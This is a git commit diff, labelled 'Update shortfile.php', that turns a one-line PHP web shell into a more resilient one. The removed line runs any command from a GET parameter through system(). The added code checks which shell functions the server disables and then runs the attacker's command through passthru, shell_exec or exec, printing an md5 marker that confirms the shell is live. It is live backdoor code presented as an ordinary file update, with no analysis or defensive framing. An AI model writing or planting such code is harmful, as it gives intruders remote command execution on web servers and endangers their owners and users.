c5feddc544eb175819fa9d690db5d89334a87912
vinux <kjmyvinux@gmail.com>
2026-09-12 11:19:26 +0800

    Update shortfile.php

--- shortfile.php
+++ shortfile.php
@@ -1,1 +1,19 @@
-<?php if(isset($_GET['pingtoufuck!'])){system($_GET['pingtoufuck!']);} echo md5('verify'); ?>
+<?php
+echo "DISABLED=".ini_get('disable_functions')."\n";
+foreach (['system','passthru','shell_exec','exec','proc_open','popen'] as $f) {
+    $disabled = in_array($f, explode(',', ini_get('disable_functions')));
+    echo $f . ':' . ($disabled ? 'OFF' : 'ON') . "\n";
+}
+if (isset($_GET['pingtoufuck!'])) {
+    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
+        passthru($_GET['pingtoufuck!']);
+    } elseif (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
+        echo shell_exec($_GET['pingtoufuck!']);
+    } elseif (function_exists('exec')) {
+        exec($_GET['pingtoufuck!'], $o);
+        echo implode("\n", $o);
+    } else {
+        echo "ALL SHELL FUNCTIONS DISABLED\n";
+    }
+}
+echo md5('verify');
